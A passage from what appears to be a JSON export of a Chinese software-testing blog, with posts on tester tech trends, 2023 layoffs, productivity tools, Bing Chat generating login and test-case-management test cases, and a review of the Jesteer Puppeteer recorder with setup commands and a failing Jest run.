大展身手的地方。\n5, VR、AR 和 MR 有可能增强从娱乐到医疗保健等各个领域的体验。\n6, 一些紧迫的问题，包括心理健康问题、处理攻击性内容、发现假新闻，需要创新的软件解决方案。\n7, 医疗保健和教育等核心领域的进一步数字化转型将伴随着更多模拟服务/体验的数字化并实现平等获取。\n8, 各行各业的公司正朝着更复杂的自给自足基础设施迈进。这意味着大量的集成和互操作性测试。\n9, 随着越来越多的流程转向在线，安全问题日益严重。有权访问敏感数据的公司必须确保用户安全和保密。\n10, 可访问性意识也在不断提高\n11, 移动流量占比稳步提升。这提醒我们兼容性测试以及不受单一地理区域限制的应用程序的本地化/国际化测试的重要性。\n12, 测试自动化很快就会被开发团队优先考虑，因为它保证了更高的准确性和更好的效率。有些公司尚未发现其全部潜力，但许多公司已在路上并实现了收益。\n13, 不久前被谨慎乐观对待的技术，如人工智能、云解决方案和区块链，正逐渐进入成熟的采用阶段。\n14, 新获得的远程团队管理能力对外包公司来说是积极的。关于与离岸团队合作的许多误解现在已经成为历史。\n15, 质量保证专家在技术和软技能方面都有大量的专业发展机会。只要新技术出现且市场竞争加剧，组织就会对支持终身学习和技能提升。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/2022-%E5%B9%B4%E5%80%BC%E5%BE%97%E6%B5%8B%E8%AF%95%E5%90%8C%E5%AD%A6%E5%85%B3%E6%B3%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E8%B6%8B%E5%8A%BF/","title":"2022 年值得测试同学关注的技术趋势"},{"content":"对很多人来说2022年可能是非常糟心的一年，我们有理由去期待2023年会触底反弹，经济环境变好，收入提高，内卷的情况得以缓解。不过从目前得到的消息来看，一切可能没有那么乐观。\n关于裁员 最近跟字节的朋友聊天，消息可能不是特别准确，不过字节大概已经在开始裁员了，飞书的目标是10%，其他业务不清楚。根据字节的体量估计的话，有可能会涉及到万人级别。\n跟腾讯的朋友聊天，他们表示已经收到消息，明年裁员会继续，不过手段会多样化，基本上会通过不续约和低绩效的方式进行淘汰。\n我们公司是二线厂，今年下半年一直在裁员，年底的时候消停了一些，不过估计明年还是会继续的。\n国外的话亚马逊开始裁员，估计会回到疫情之前的人员规模。\n可以看到2023年互联网的企业的主旋律还是裁员，保住饭碗苟下去应该是大多数人的明智之举。\n关于换工作 跟猎头聊了一下，字节国内的hc应该基本上冻结了，我们公司只裁人不招人，腾讯那边不清楚，少量的hc进行血液流通还是会有的。其他厂没有了解过，不过根据之前被裁的同事反馈2022下半年还是能找到工作的，机会不多，但不是完全没有。很多人去了字节，算是一个稳定的退路，但2023年估计字节也不好进去，除非降低预期往二三线厂看看，不然退路方面的可选择面还是比较少的。\n2023也不是不能换工作，比如换个行业之类的也是比较不错的思路，不过还是不建议裸辞，找到了再换可能更好一点。\n另外这几年创业的热潮似乎已经冷却，新的工作机会很难创造出来，去初创企业搏一搏的机会可能都会很少了。\n关于年终奖 最近腾讯的朋友们表示已经在吹风了，说今年的年终奖会比之前少很多，其他厂不知道怎么样，不过整个互联网行业的年终收益估计都会有所折扣吧。我们公司也是年终奖大幅减少，并且取消了年度涨薪。\n如果是合同规定的年终奖，比如合同规定了15薪，那么年底就是3薪，这是毋庸置疑的；不过如果合同规定的是浮动年终奖，那么可以讨论的空间可能就不大了。\n关于希望 经济滞胀，收入锐减，消费降级，预期降低可能会是2023年的主旋律，按道理说在这种大环境下，大家退一步躺平，心平气和，看破红尘反而最有可能海阔天空。但现实的情况是，大家都不想失业，于是越来越卷，越来越焦虑。\n希望还是有的，不过是从长期来看。对于2023，也许不能期待太多，只能把目光放长远，看看3年5年之后，活在当下但心在远方，坚持下去吧。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/2023%E5%B9%B4%E4%BD%A0%E8%BF%98%E8%83%BD%E7%9C%8B%E5%88%B0%E5%B8%8C%E6%9C%9B%E4%B9%88/","title":"2023年你还能看到希望么"},{"content":"现在的工具站点已经非常智能了，看到一篇推荐2023年的一些杀手级的工具推荐，有些会极大的提升工作效率，深以为然，稍微翻译分享一下。\nTinyWOW 这是一个各种文件处理的工具大杂烩，提供免费pdf转换等功能，最好的地方是所有处理后的文件和源文件都会在1小时后被删除。\n下面这些功能都是免费的\n去除图片背景 合并pdf pdf转jpg jpg转pdf 压缩pdf 分割pdf word转pdf pdf转word 解锁pdf pdf转excel 地址：tinywow.com\njenni.ai 你只要随便写点东西，然后使用jenni.ai进行润色，有了人工智能的帮助，你可以以10倍的速度写博客、论文或其他东西。\n在写论文方面，Jenni可以自动找到相关的引文，并自动链接它们。它可以在几秒钟内轻松地转述句子和段落，这意味着它输出99%的无抄袭内容，查重福音。\n地址：jenni.ai\nTemp-mail 这个站点是生成一次性的临时邮箱的，10分钟后自动销毁，懂得都懂。\ntemp-mail.org\nLoom Loom是一个免费的录屏软件，可以在Mac、Windows、Chrome、iOS和Android设备上使用。无论你的收件人在哪里，你都可以粘贴你的视频链接，他们无需登录或创建账户即可观看。你还可以使用表情符号反应、带时间戳的评论和互动功能来回应视频，并保持你与团队的联系。\n地址：loom.com\nOtter Otter记录会议，实时做会议纪要，并自动生成会议总结与大家分享，帮助你记住会议中的一切。它鼓励员工跳过不必要的会议，同时分享会议记录，让他们了解情况。Otter将笔记存储在一个中央的、安全的、可搜索的地方，这样你和你的团队就能更多的进行协作，提高工作效率。\notter.ai\nRemove.bg 免费的在线去除图片背景的服务。\n这个强大的人工智能工具可以快速、免费、无需注册地处理你的图像。号称世上最强，为你节省时间，提高生产力，提升你的工作效率。\nwww.remove.bg\nConvertio.co 可以转换超过309种不同的文件类型，包括图像、电子表格、电子书、档案、演示文稿、音频、视频格式等等。\n总结 这里面有些工具还是很有意思的，大家有兴趣可以尝试一下。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/7%E4%B8%AA%E6%8F%90%E5%8D%87%E5%B7%A5%E4%BD%9C%E6%95%88%E7%8E%87%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B72023%E7%89%88/","title":"7个提升工作效率的在线工具2023版"},{"content":"ChatGPT4已经发布了并引起了巨大的反响，有一些基于ChatGPT的应用还是令人印象深刻的，比如\n画个草图，让ChatGPT根据草图去生成一个有完备功能的网页； 让ChatGPT实现一个可以在网页上运行的贪吃蛇游戏； 看图说话 调教ChatGPT让其在几小时内写一个chrome扩展 在GPT4的论文中有一句话是这么说的：\nGPT-4和类似的模型可能会从此引起失业，甚至那些需要多年经验和教育的职位也可能逐渐消失，比如法律服务。\n简单理解就是GPT-4模型专治老专家，作为功能测试人员，领域经验往往是非常核心的竞争力，从业年限越久，老专家属性越明显。那么ChatGPT可以替代软件测试从业者么？\n我们不妨直接试一试先，验证一下这个想法。\n最简单的登录用例 ChatGPT4需要尊贵的会员才能使用，bing的聊天功能就成了比较理想的平替了，据说其背后也是gpt4模型。下面所有的内容均是使用bing生成的。\n问：我有一个web系统的登录页面，其中有1个用户名的文本框，密码文本框以及登录按钮，请帮我写一些测试用例来验证登录功能？\n你好，这是Bing。我可以帮你写一些测试用例来验证登录功能。根据网上的资料1234，你可以从以下几个方面来设计测试用例：\n功能测试：检查用户名、密码、验证码的输入和校验，以及登录按钮的点击和跳转 性能测试：检查登录界面的加载速度，以及不同情况下的响应时间 界面测试：检查登录界面的布局、样式、字体、颜色等是否符合设计要求 安全性测试：检查是否有防止SQL注入、暴力破解、跨站脚本等攻击的措施 兼容性测试：检查在不同的浏览器、操作系统、分辨率下是否能正常显示和使用 可用性测试：检查是否支持Tab和Enter键，以及提示语是否友好 你想要我给你具体的例子吗？\n问：是的，请给我一些功能测试的例子。\n好的，我可以给你一些功能测试的例子。根据网上的资料²³⁴，你可以按照以下的表格来编写测试用例：\n测试点 用例编码 测试用例描述 预期结果 正常登录 001 输入正确的用户名和密码，点击登录按钮 成功登录 用户名为空 002 输入空的用户名和正确的密码，点击登录按钮 提示用户名不能为空 密码为空 003 输入正确的用户名和空的密码，点击登录按钮 提示密码不能为空 用户名错误 004 输入不存在或错误的用户名和任意密码，点击登录按钮 提示用户名或密码错误 密码错误 005 输入正确的用户名和错误的密码，点击登录按钮 提示用户名或密码错误 验证码为空或错误（如果有） 006-007 输入正确或错误的验证码，以及正确或错误的用户名和密码，点击登录按钮 根据验证码是否正确提示相应信息 连续多次输入错误（如果有） 008-009 连续输入3次或更多次错误的用户名或密码，观察系统行为（是否锁定账号、显示倒计时、要求重置等） 根据系统设计给出相应提示 使用Tab和Enter键（如果有） 010-011 使用Tab键在各个输入框之间切换，使用Enter键代替点击登录按钮，观察系统行为（是否能正常切换、提交等） 根据系统设计给出相应响应 这些是一些基本的功能测试用例。你还想要我给你其他方面的测试用例吗？\n源: 与必应的对话， 2023/3/16(1) 登录测试用例_theone19的博客-CSDN博客. https://blog.csdn.net/romon19/article/details/80832809 访问时间 2023/3/16. (2) 登录功能常用测试用例 - 肖兔—随遇而安 - 博客园. https://www.cnblogs.com/Happy-To-Lucky/p/14183788.html 访问时间 2023/3/16. (3) 登录功能测试用例设计 - 可可萝·瑾萱 - 博客园. https://www.cnblogs.com/jxuan/p/14785570.html 访问时间 2023/3/16. (4) 登录功能设计用例（测试导师版）_软件测试李同学的博客-CSDN博客. https://bing.com/search?q=web%e7%b3%bb%e7%bb%9f%e7%99%bb%e5%bd%95%e5%8a%9f%e8%83%bd%e6%b5%8b%e8%af%95%e7%94%a8%e4%be%8b 访问时间 2023/3/16.\n问：是的，更多用例\n你想要我给你哪个方面的测试用例？是性能测试、界面测试、安全性测试、兼容性测试还是可用性测试？\n问：性能测试\n好的，我可以给你一些性能测试的例子。根据网上的资料¹²，你可以按照以下的表格来编写测试用例：\n测试点 用例编码 测试目的 并发用户数 模拟用户行为 预期结果 登录响应时间 li_001 测试100个虚拟用户并发时，系统登录的响应时间 100个 1)进入登录界面 2)输入用户名和密码，点击“登录”按钮 系统登录的响应时间不能超过5秒 登录成功率 li_002 测试1000个虚拟用户并发时，系统登录的成功率 1000个 1)进入登录界面 2)输入用户名和密码，点击“登录”按钮 系统登录的成功率不能低于95% 登录负载均衡 li_003 测试5000个虚拟用户并发时，系统是否能够自动分配负载到不同服务器上 5000个 1)进入登录界面 2)输入用户名和密码，点击“登录”按钮 系统能够自动分配负载到不同服务器上，并保证每台服务器的CPU、内存、网络等资源使用率不超过80% 这些是一些基本的性能测试用例。你还想要我给你其他方面的测试用例吗？\n源: 与必应的对话， 2023/3/16(1) 性能测试中如何编写测试用例 - 知乎. https://zhuanlan.zhihu.com/p/373180730 访问时间 2023/3/16. (2) 登录功能常用测试用例 - 肖兔—随遇而安 - 博客园. https://www.cnblogs.com/Happy-To-Lucky/p/14183788.html 访问时间 2023/3/16. (3) 登录测试用例 - 知乎. https://zhuanlan.zhihu.com/p/375249371 访问时间 2023/3/16.\n问：用什么工具做性能测试呢？\n性能测试工具有很多种，你可以根据你的需求和预算来选择。根据网上的资料¹²³⁴⁵，一些主流的性能测试工具有：\nLoadRunner（商用版）：是一款功能强大、支持多种协议和平台的性能测试工具，可以模拟大量用户对系统进行压力测试，分析系统的性能瓶颈和问题。 JMeter（开源免费）：是一款基于Java开发的性能测试工具，可以对Web应用、数据库、FTP等进行压力测试，支持多种协议和插件，易于扩展和定制。 NeoLoad（商用版）：是一款专注于Web应用和移动应用的性能测试工具，可以模拟真实用户行为和网络环境，提供丰富的报告和分析功能。 WebLOAD（商用版）：是一款针对Web应用和移动应用的负载测试工具，可以模拟复杂的业务场景，支持多种协议和技术，提供实时监控和诊断功能。 Loadstorm（商用版本）：是一款针对Web应用的云端负载测试工具，通过模拟海量点击来测试Web应用在大负载下的性能表现。由于采用了云资源，所以Loadstorm的测试成本非常低。 这些只是一部分性能测试工具。你还想要我给你其他方面的信息吗？\n源: 与必应的对话， 2023/3/16(1) 10大主流性能测试工具推荐 - 知乎. https://bing.com/search?q=%e6%80%a7%e8%83%bd%e6%b5%8b%e8%af%95%e5%b7%a5%e5%85%b7 访问时间 2023/3/16. (2) 什么是性能测试？性能测试主流工具有哪些？ - 知乎. https://zhuanlan.zhihu.com/p/58000740 访问时间 2023/3/16. (3) 推荐几款常用的性能测试工具-InfoQ. https://www.infoq.cn/article/k9kx0rxebhht*ilut9iv 访问时间 2023/3/16. (4) 这 5 款实用性能测试工具，你会如何选择？ - 知乎. https://zhuanlan.zhihu.com/p/94064601 访问时间 2023/3/16. (5) 10大主流性能测试工具推荐 - 知乎. https://zhuanlan.zhihu.com/p/98612628 访问时间 2023/3/16. (6) 10大主流压力/负载/性能测试工具推荐 - 知乎. https://zhuanlan.zhihu.com/p/26671961 访问时间 2023/3/16.\n问：能给一个jmeter进行登录测试的例子吗 JMeter是一款基于Java开发的性能测试工具，可以对Web应用、数据库、FTP等进行压力测试，支持多种协议和插件，易于扩展和定制。³\n要使用JMeter进行登录测试，你需要先配置好HTTP请求的参数，如协议、服务器名称或IP、端口号、路径等。然后你需要添加一个HTTP请求采样器，填写登录接口的URL和请求方法（通常是POST），以及登录所需的参数（如用户名和密码）。²⁴⁵\n如果登录接口需要携带Cookie或Session信息，你还需要添加一个HTTP Cookie管理器或HTTP Header管理器来保存和发送这些信息。¹⁴\n最后，你可以添加一个查看结果树或聚合报告来查看登录测试的结果，如响应时间、响应数据、错误率等。²⁴⁵\n下面是一个JMeter进行登录测试的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Thread Group - Number of Threads: 10 - Ramp-Up Period: 10 - Loop Count: 2 HTTP Request Defaults - Protocol: http - Server Name or IP: www.example.com - Port Number: 80 HTTP Cookie Manager HTTP Request (Login) - Path: /login - Method: POST - Parameters: - name: username, value: testuser - name: password, value: testpass View Results Tree 这个例子表示在10秒内模拟10个用户对www.example.com/login接口进行POST请求，发送用户名和密码参数，并保存Cookie信息。循环执行两次，共计20次请求，并查看结果树。\n希望这个例子能对你有所帮助。\n源: 与必应的对话， 2023/3/16(1) 使用jmeter完成登录功能的接口测试和性能测试_qy_getforward的博客-CSDN博客. https://blog.csdn.net/qy_getforward/article/details/104490930 访问时间 2023/3/16. (2) jmeter登录配置 - wangzaiplus - 博客园. https://www.cnblogs.com/wangzaiplus/p/10855984.html 访问时间 2023/3/16. (3) jmeter接口测试之登录测试 - 做梦的人- - 博客园. https://www.cnblogs.com/chongyou/p/5355832.html 访问时间 2023/3/16. (4) jmeter接口测试（登录、注册） - yangcube - 博客园. https://www.cnblogs.com/yangcube/p/7824818.html 访问时间 2023/3/16. (5) jmeter登录配置 - wangzaiplus - 博客园. https://bing.com/search?q=jmeter%e7%99%bb%e5%bd%95%e6%b5%8b%e8%af%95 访问时间 2023/3/16.\n问：登录页面的安全测试怎么做？\n登录页面的安全测试是指对登录页面的安全性进行检查，防止用户的信息被泄露或者被恶意攻击。²³⁴\n登录页面的安全测试主要包括以下几个方面：\n用户名和密码是否通过加密的方式，发送给Web服务器，避免被截取或者篡改。¹ 登录成功后生成的Cookie，是否是httponly (否则容易被脚本盗取)。¹ 登录密码在数据库中不能明文显示，要使用哈希或者加密算法进行存储。⁴ 登录密码要隐文显示，不支持复制粘贴，避免被他人窥视或者复制。³⁴ 登录用户名需要限制输入大小写，避免因为大小写不一致而导致登录失败。⁴ 登录失败需要限制登录次数，设置验证码或者锁定账号等措施，防止暴力破解。²³⁴ 登录需要添加唯一识别标志（如CSRF Token），防止跨站请求伪造攻击。²⁴ 这些是一些常见的登录页面安全测试点，你还有其他问题吗？\n源: 与必应的对话， 2023/3/16(1) 登录框安全测试 - FreeBuf网络安全行业门户. https://www.freebuf.com/articles/web/276120.html 访问时间 2023/3/16. (2) 给你一个登录界面，你会怎么测（登陆页面测试） - 风轻扬Yang - 博客园. https://www.cnblogs.com/fuxiang-li/p/14018348.html 访问时间 2023/3/16. (3) 安全性测试：以用户登录为例_登录安全性测试_飞翔的大黑壮(猫猫)的博客-CSDN博客. https://blog.csdn.net/pingsha_luoyan/article/details/104104557 访问时间 2023/3/16. (4) 登录页面测试点_kinaxsu的博客-CSDN博客. https://blog.csdn.net/kinaxsu/article/details/88353159 访问时间 2023/3/16.\n初步看来 生成的功能测试用例还是水平在线的，特别是用例都有描述和预期结果，起码生成的都是结构完备的测试用例。从功能覆盖率上说也没啥问题，基本的要点都有，而且异常情况也有比较多的覆盖。\n在性能测试方面也没啥大问题，尽管直接拿来执行不太可能，不过测试的思路是有了的。\n安全测试方面很惊艳，比我自己考虑的都要全面。\n难度升级 登录页面太简单，来点复杂的。\n问: 我有一个测试用例管理系统，系统里有一个创建测试用例的功能。创建页面上有3个字段，用例名称，测试步骤，预期结果，这三个字段都是必填的，还有一个创建按钮，如果所有必填项都完备的话，点击后会成功创建，否则会给出错误提示。请根据我的描述尽可能多的生成测试用例\n你好，我是Bing。我可以帮助你生成一些测试用例，但是你需要提供更多的信息，比如测试目标、测试范围、测试环境等。根据你的描述，我猜测你的系统是一个基于web的测试用例管理系统¹²⁴⁵，如果是这样的话，你可以参考以下的一些测试用例：\n用例编号：TC001\n所属模块：创建测试用例\n测试标题：验证所有必填字段都完备时，可以成功创建测试用例\n重要级别：高\n前置条件：已登录系统，并进入创建页面\n测试输入：用例名称为“登录功能正常”，测试步骤为“1.打开浏览器；2.输入网址；3.输入用户名和密码；4.点击登录按钮”，预期结果为“登录成功并跳转到首页”\n操作步骤：\n1.在用例名称字段输入“登录功能正常” 2.在测试步骤字段输入“1.打开浏览器；2.输入网址；3.输入用户名和密码；4.点击登录按钮” 3.在预期结果字段输入“登录成功并跳转到首页” 4.点击创建按钮 预期结果：提示“创建成功”，并显示刚刚创建的测试用例\n用例编号：TC002\n所属模块：创建测试用例\n测试标题：验证缺少任意一个必填字段时，无法创建测试用例，并给出错误提示\n重要级别：高\n前置条件：已登录系统，并进入创建页面\n测试输入：\na)缺少用例名称，其他字段正常填写 b)缺少测试步骤，其他字段正常填写 c)缺少预期结果，其他字段正常填写 操作步骤：\na)在用例名称字段不输入任何内容，在其他两个字段正常填写后，点击创建按钮 b)在测试步骤字段不输入任何内容，在其他两个字段正常填写后，点击创建按钮 c)在预期结果字段不输入任何内容，在其他两个字段正常填写后，点击创建按钮 预期结果：\na)提示“请输入用例名称”，并且不会创建新的测试用例 b)提示“请输入测试步骤”，并且不会创建新的测试用例 c)提示“请输入预期结果”，并且不会创建新的测试用例 以上只是一些简单的示例，请根据实际情况进行调整和补充。如果你想了解更多关于如何编写和管理测试用例的方法⁸⁹ [^10^] ¹¹ ，请访问以下链接：\n源: 与必应的对话， 2023/3/16(1) 10款最佳测试用例管理工具（免费、付费、开源）. https://baijiahao.baidu.com/s?id=1740319415992712023 访问时间 2023/3/16. (2) 测试管理平台大比拼 - 知乎. https://zhuanlan.zhihu.com/p/25969789 访问时间 2023/3/16. (3) 云效测试管理_企业级测试管理平台-阿里云. https://www.aliyun.com/product/yunxiao/testhub 访问时间 2023/3/16. (4) 测试用例管理系统 Testrail 简介 - 知乎. https://zhuanlan.zhihu.com/p/79703736 访问时间 2023/3/16. (5) 如何编写测试用例_liulang68的博客-CSDN博客. https://blog.csdn.net/liulang68/article/details/116083975 访问时间 2023/3/16. (6) C/C++ 单元自动化测试解决方案实践 - vivo互联网技术 - 博客园. https://www.cnblogs.com/vivotech/p/16312678.html 访问时间 2023/3/16. (7) 如何编写测试用例？ - 知乎. https://www.zhihu.com/question/51558124 访问时间 2023/3/16. (8) 新手必看：如何写测试用例？ - 知乎. https://zhuanlan.zhihu.com/p/208305623 访问时间 2023/3/16. (9) 有哪些比较好的测试用例管理工具？ - 知乎. https://www.zhihu.com/question/26898212 访问时间 2023/3/16. (10) 如何使用apifox打包测试用例生成测试套件自动化执行_测试小白中的小白的博客-CSDN博客. https://bing.com/search?q=%e5%a6%82%e4%bd%95%e7%94%9f%e6%88%90%e6%b5%8b%e8%af%95%e7%94%a8%e4%be%8b 访问时间 2023/3/16. (11) 如何使用apifox打包测试用例生成测试套件自动化执行_测试小白中的小白的博客-CSDN博客. https://blog.csdn.net/weixin_55613512/article/details/126917283 访问时间 2023/3/16.\n问：请补充更多用例 好的，我可以根据你的需求，再补充一些测试用例，但是你需要明确你的测试目标是什么，比如功能测试、性能测试、安全测试等。不同的测试目标，需要考虑的因素和场景也不同。¹²³⁴⁵\n假设你的测试目标是功能测试，那么你可以参考以下的一些测试用例：\n用例编号：TC003\n所属模块：创建测试用例\n测试标题：验证输入非法字符时，无法创建测试用例，并给出错误提示\n重要级别：中\n前置条件：已登录系统，并进入创建页面\n测试输入：\na)在用例名称字段输入特殊字符或空格，在其他两个字段正常填写后，点击创建按钮 b)在测试步骤字段输入特殊字符或空格，在其他两个字段正常填写后，点击创建按钮 c)在预期结果字段输入特殊字符或空格，在其他两个字段正常填写后，点击创建按钮 操作步骤：\na)在用例名称字段输入“@#$%^\u0026amp;*”，在其他两个字段正常填写后，点击创建按钮 b)在测试步骤字段输入“@#$%^\u0026amp;*”，在其他两个字段正常填写后，点击创建按钮 c)在预期结果字段输入“@#$%^\u0026amp;*”，在其他两个字段正常填写后，点击创建按钮 预期结果：\na)提示“请输入有效的用例名称”，并且不会创建新的测试用例 b)提示“请输入有效的测试步骤”，并且不会创建新的测试用例 c)提示“请输入有效的预期结果”，并且不会创建新的测试用例 用例编号：TC004\n所属模块：创建测试用例\n测试标题：验证超过最大长度限制时，无法创建测试用例，并给出错误提示\n重要级别：中\n前置条件：已登录系统，并进入创建页面；假设每个字段都有最大长度限制为1000个字符。\n测试输入：\na)在用例名称字段输入超过1000个字符，在其他两个字段正常填写后，点击创建按钮 b)在测试步骤字段输入超过1000个字符，在其他两个字段正常填写后，点击创建按钮 c)在预期结果字段输入超过1000个字符，在其他两个字段正常填写后，点击创建按钮 操作步骤：\na)在用例名称字段输入“登录功能正常”重复200次，在其他两个字段正常填写后，点击创建按钮 b)在测试步骤字段输入“1.打开浏览器；2.输入网址；3.输入用户名和密码；4.点击登录按钮”重复50次，在其他两个字 源: 与必应的对话， 2023/3/16(1) 10款最佳测试用例管理工具（免费、付费、开源）. https://baijiahao.baidu.com/s?id=1740319415992712023 访问时间 2023/3/16. (2) 测试管理平台大比拼 - 知乎. https://zhuanlan.zhihu.com/p/25969789 访问时间 2023/3/16. (3) 有哪些比较好的测试用例管理工具？ - 知乎. https://www.zhihu.com/question/26898212 访问时间 2023/3/16. (4) 云效测试管理_企业级测试管理平台-阿里云. https://www.aliyun.com/product/yunxiao/testhub 访问时间 2023/3/16. (5) 测试用例管理系统 Testrail 简介 - 知乎. https://zhuanlan.zhihu.com/p/79703736 访问时间 2023/3/16.\n表现惊艳 不仅可以理解测试用例管理系统是什么，而且还把登录用例作为测试数据放在了用例里 基本上功能测试的点都能覆盖到 不过因为用例管理系统里有很多领域相关的知识，比如用例编号应该有格式等，这些是bing的搜索结果里所缺失的，所以生成的用例偏common sense， 专业程度不够。但如果基于特定的领域去做训练的话，专业程度提升也是触手可得的事情。\n我的看法 如果训练的材料足够多且精准，ChatGPT完全可以替代测试人员进行用例的编写，但是目前看来生成的用例还是需要人工去执行，所以点来点去的工作短期无法取代，不过后面AI的发展可能会从生成内容变成执行操作，因此未来的某一天点点点的工作也可能被取代。不过gpt生成的用例是否合理并且有无遗漏这点还是要专业人士来评判，所以测试老专家们大可不必担心，以后的测试行为可能变成：让AI写用例，老司机修改和补充用例，最后让初级和中级测试人员甚至是AI进行用例的执行和反馈。\n除了写用例之外，测试同学还可以使用ChatGPT来进行自动化代码的生成，从而可以提高一些生产效率，所以短期来看，使用ChatGPT辅助进行自动化测试的生产力提升的操作还是可以期待一下的。这可以比较好的解决一些测试同学代码能力不足的问题，不过凡是都有两面性，尽管可以用AI来辅助做自动化测试，但是AI生成的代码如果有问题需要修改的话，还是需要很强的编程能力的。所以哪怕是辅助做自动化测试，本质上还是利好老司机。\n中期看来AI将会成为强大的测试提效工具，比如生成一些测试文档，用例等。\n从足够远的远期来看，最终大部分基于有限经验的进行测试的测试人员可能会被AI取代，剩下一些老司机进行更具创造性的测试工作。测试人员的规模可能会减少，但测试这个角色应该还会存在。\n你的既有经验将被机器学习和传承，你的创造力才是立身之本。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/chatgpt%E8%83%BD%E5%86%99%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E4%BA%86%E8%BF%99%E4%BC%9A%E6%B7%98%E6%B1%B0%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E5%90%97/","title":"Chatgpt能写测试用例了，这会淘汰测试人员吗?"},{"content":"之前跟大家分享后chrome上原生的录制回放功能，今天看到了一款最新的的录制回放工具jesteer，于是第一时间来了解和试用一下。\n主要功能 不用写代码，直接可以录制和回放 可以录制基本的页面交互 自动创建基于Puppeteer的脚本 回放时的快照检查功能 简单舒适的web ui 安装 jesteer是一款chrome插件，直接去chrome商店里所有jesteer点击安装既可。\n界面 jesterr的界面很简单，就3个按钮\nRecord：开始录制 Take a snapshot：dom高亮 Copy to clipboard 简单上手使用 点击Record开始录制 录制过程中点击Take a snapshot进行断言 点击Stop Recording停止录制 点击Copy to clipboard拷贝生成的代码到剪切板 这几步还是非常简单的，后来我遇到了一个问题，怎么进行用例的回放呢？之前chrome自带的Recorder是可以录制完成后直接回放的，而jesteer则找不到回放按钮。折腾一小会后我终于找到了答案。\n把生成的代码粘贴到测试项目中 为了可以运行生成的代码，我决定新建一个nodejs项目来进行尝试。\n1 2 3 4 5 6 mkdir jesteer_example cd jesteer_example npm init npm install --save-dev jest npm install --save-dev puppteer touch example.test.js 修改package.json\n1 2 3 4 5 { \u0026#34;scripts\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;jest\u0026#34; } } 我打开一个空白页，然后输入www.itest.info，跳转到搜索页面后，添加一个snapshot断言，最后结束录制。下面是录制出来的脚本。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 /* This test suite was created using JESTEER, a project developed by Tim Ruszala, Katie Janzen, Clare Cerullo, and Charissa Ramirez. Learn more at https://github.com/oslabs-beta/Jesteer . */ const puppeteer = require(\u0026#39;puppeteer\u0026#39;); // v13.0.0 or later jest.setTimeout(10000); describe(\u0026#39;\u0026#39;, () =\u0026gt; { let browser, page, timeout; beforeAll(async () =\u0026gt; { browser = await puppeteer.launch({ headless: true, }); }); beforeEach(async () =\u0026gt; { page = await browser.newPage(); timeout = 5000; page.setDefaultTimeout(timeout); }); afterEach(async () =\u0026gt; { await page.close(); }); afterAll(async () =\u0026gt; { await browser.close(); }); it(\u0026#39;\u0026#39;, async () =\u0026gt; { { const promises = []; promises.push(page.waitForNavigation()); await page.goto(\u0026#39;chrome://newtab/\u0026#39;); await Promise.all(promises); } await page.waitForNavigation(); await page.keyboard.type(\u0026#39;itest.info\u0026#39;); await page.keyboard.press(\u0026#39;Enter\u0026#39;); { const element = await page.waitForSelector(\u0026#39;#su\u0026#39;); await element.click(); } { const element = await page.waitForSelector(\u0026#39;HTML \u0026gt; BODY:nth-child(2)\u0026#39;); await element.click(); } await page.waitForNavigation(); { const snapped = await page.$eval(\u0026#39;#1 \u0026gt; DIV:nth-child(1) \u0026gt; DIV:nth-child(1) \u0026gt; H3:nth-child(1) \u0026gt; A:nth-child(1)\u0026#39;, el =\u0026gt; el.innerHTML); expect(snapped).toMatchSnapshot(); } }); }); 使用npm run test命令来运行，不出意外运行失败。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 FAIL ./sum.test.js ✕ (297 ms) ● › net::ERR_INVALID_URL at chrome://newtab/ 37 | const promises = []; 38 | promises.push(page.waitForNavigation()); \u0026gt; 39 | await page.goto(\u0026#39;chrome://newtab/\u0026#39;); | ^ 40 | await Promise.all(promises); 41 | } 42 | at navigate (node_modules/puppeteer/src/common/FrameManager.ts:226:13) at FrameManager.navigateFrame (node_modules/puppeteer/src/common/FrameManager.ts:198:17) at Frame.goto (node_modules/puppeteer/src/common/FrameManager.ts:792:12) at Page.goto (node_modules/puppeteer/src/common/Page.ts:1781:12) at Object.\u0026lt;anonymous\u0026gt; (sum.test.js:39:1) 查了一下代码，应该是打开chrome的新tab页面之后自动等待的代码报错导致。\n初步结论 初步结论现在应该有了，jesteer录制出来的代码其实没办法自动识别上下文，也就是说如果在地址栏上输入url并按回车键打开一个新页面，我们期望的结果是直接录制成goto url，但是jesteer只能忠实的还原我们的操作，而这些操作有可能导致回放失败。\n总结 先说优点\njesteer作为一款纯录制工具，其提供的snapshot比对功能还是非常强大的，等于是支持了在录制时候直接录制断言的能力； jesteer可以录制用户的一系列简单交互，对于一些页面来说还是很管用的； 根据jesteer的文档描述，jesteer比chrome原生的recorder录制准确性更高； jesteer录制出的脚本集成了jest框架，等于可以直接录制用例，而不是一系列的操作，省去了把脚本加工成用例的过程； 再说不足\njesteer需要用户对nodejs有一定的了解，不能直接录制完就一键回放； jesteer录制出的脚本需要进行一些加工，比如上文可以感知到的修改goto的语句的工作； jesteer帮助文档比较简单，想上手用起来需要发挥一点点的想象力 最后 